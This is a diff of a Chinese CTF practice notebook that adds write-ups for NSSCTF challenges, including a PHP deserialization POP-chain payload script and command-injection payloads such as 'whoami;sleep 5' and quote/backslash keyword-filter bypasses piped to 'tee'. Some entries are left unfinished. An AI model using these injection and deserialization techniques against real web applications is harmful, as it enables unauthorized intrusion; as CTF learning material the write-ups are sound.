@@ -630,7 +630,7 @@ echo $b;
 
 （/identity” 通常是一个 HTTP 请求路径，用于与身份（identity）相关的操作）
 
-20.[长城杯 2021 院校组]签到
+21.[长城杯 2021 院校组]签到
 
 得到一串十六进制数5a6d78685a3374585a57786a6232316c5833527658324e6f5957356e5932686c626d64695a544639
 
@@ -638,7 +638,7 @@ echo $b;
 
 ![1744907156457](image/NSS/1744907156457.png)
 
-21.[SWPUCTF 2022 新生赛]ez_ez_php
+22.[SWPUCTF 2022 新生赛]ez_ez_php
 
 题目的标签中含有php伪协议，文件包含等，进入题目环境，查看代码
 
@@ -666,11 +666,11 @@ substr（）函数要求传入get请求的代码前三位必须是php，所以�
 
 ![1744943086440](image/NSS/1744943086440.png)
 
-22.[SWPUCTF 2021 新生赛]error
+23.[SWPUCTF 2021 新生赛]error
 
 使用sqlmap先做完题（再学习一遍sql查询的命令！！！！！！！！！！)
 
-23.[陇剑杯 2021]webshell（问1）
+24.[陇剑杯 2021]webshell（问1）
 
 题目要求用wireshark进行流量分析，然后找到黑客登录用的密码
 
@@ -691,7 +691,7 @@ x3.一般进入的是login页面
 
 flag为NSSCTF{`Admin123!@#`}
 
-24.[SWPU 2019]神奇的二维码
+25.[SWPU 2019]神奇的二维码
 
 下载附件，是一个二维码扫描后发现是一个假的flag
 
@@ -743,7 +743,7 @@ binwalk -e '/home/kali/Desktop/MISC-神奇的二维码-BitcoinPay.png'
 NSSCTF{morseisveryveryeasy}
 ```
 
-25. [SWPUCTF 2021 新生赛]easyupload3.0
+26.[SWPUCTF 2021 新生赛]easyupload3.0
 
 这是一个文件上传问题，首先尝试上传一句话木马，发现被阻止了。
 
@@ -776,4 +776,130 @@ sctf.cn:21624/upload/1.jpg
 
 得到flag
 
-26.[SWPUCTF 2021 新生赛]pop
+27.[SWPUCTF 2021 新生赛]pop
+
+查看源代码，发现是一个反序列化的题目
+
+![1745377994509](image/NSS/1745377994509.png)
+
+让我们尝试来理解题目的代码逻辑：
+
+题目要求我们调用w44m类中的Getflag（）函数并且使得
+
+$admin=w44m
+
+$passwd=08067
+
+时得到flag
+
+w22m类中有一个 `$w00m`属性，并且还有一个魔术方法__desturt(),当对象被销毁时会自动调用。在这个方法里，它会尝试输出 `$w00m` 的值
+
+w33m类中有一个 `$w00m`属性和 `$w22m`属性，还有一个魔术方法__toString(),当对象被当作字符串使用时会自动调用。在这个方法里，它会调用 `$w00m` 对象中名为 `$w22m` 的方法
+
+通过编写序列化代码来尝试解决
+
+```
+<?php
+
+class w44m
+{
+    private $admin = 'w44m';
+    protected $passwd = '08067';
+}
+
+class w22m
+{
+    public $w00m;
+}
+
+class w33m
+{
+    public $w00m;
+    public $w22m;
+}
+
+$w44m = new w44m();
+$w22m = new w22m(); 
+$w33m = new w33m();
+
+$w33m->w00m = $w44m;
+$w33m->w22m = 'Getflag';
+$w22m->w00m = $w33m;
+
+
+$playload = serialize($w22m);
+echo urlencode($playload);
+?>
+```
+
+然后尝试简化一点的代码逻辑,要获取flag，需要构造一个特定的反序列化载荷，利用PHP对象注入触发方法调用链，使得最终执行 `w44m::Getflag()(要求admin=w44m，passwd=08067，利用反序列化修改w44m的私有属性admin和受保护属性passwd)`
+
+w22m的__destruct方法会输出w00m属性
+
+w33m的__toString方法会调用w00m属性的方法（方法名由w22m属性指定)
+
+构造利用链，创建w22m对象，其w00m属性为w33m对象，w33m对象的w00m属性指向修改后的w44m实例，w22m属性设为‘Getflag’
+
+先进行
+
+28.[SWPUCTF 2021 新生赛]finalrce
+
+| 方面                 | `exec()`                                         | `eval()`                                            |
+| -------------------- | -------------------------------------------------- | ----------------------------------------------------- |
+| **用途**       | 用于执行外部系统命令（如操作系统命令）。           | 用于执行 PHP 代码字符串。                             |
+| **执行机制**   | 在操作系统层面执行命令。                           | 在 PHP 解释器层面执行代码。                           |
+| **安全性风险** | 可能导致命令注入攻击。                             | 可能导致代码注入攻击。                                |
+| **返回值**     | 默认返回命令输出的最后一行，可选参数获取完整输出。 | 返回执行的 PHP 代码的结果，通常是最后一个表达式的值。 |
+| **应用场景**   | 系统管理、与其他程序交互等。                       | 动态生成和执行 PHP 代码。                             |
+
+![1746755937950](image/NSS/1746755937950.png)
+
+查看代码，发现有关键字的过滤
+
+仔细一看发现没有过滤whoami,然后睡5秒再回应，尝试一下，发现返回 can you see anything?
+
+```
+/?url=whoami;sleep 5
+```
+
+尝试一下简单过滤,并将结果保存到网站的/1.txt文件里
+
+```
+/?url=l''s / | tee 1.txt
+```
+
+访问1.txt发现
+
+![1746758880700](image/NSS/1746758880700.png)
+
+由于cat被过滤，我们可以用tac命令
+/?url=tac /a_here_is_a_f1ag | tee 2.txt
+发现提示我们在fllllllaaaaaggggg里
+所以尝试获取，发现la是被过滤了
+
+尝试绕过用flllll\aaaaaaggggggg
+/?url=tac /flllll\aaaaaaggggggg | tee 3.txt
+访问得到flag
+
+
+由于cat被过滤，我们可以用tac命令
+
+```
+/?url=tac /a_here_is_a_f1ag | tee 2.txt
+```
+
+发现提示我们在fllllllaaaaaggggg里
+
+所以尝试获取，发现la是被过滤了
+
+尝试绕过用flllll\aaaaaaggggggg
+
+```
+/?url=tac /flllll\aaaaaaggggggg | tee 3.txt
+```
+
+访问得到flag
+
+![1746759199899](image/NSS/1746759199899.png)
+
+29.
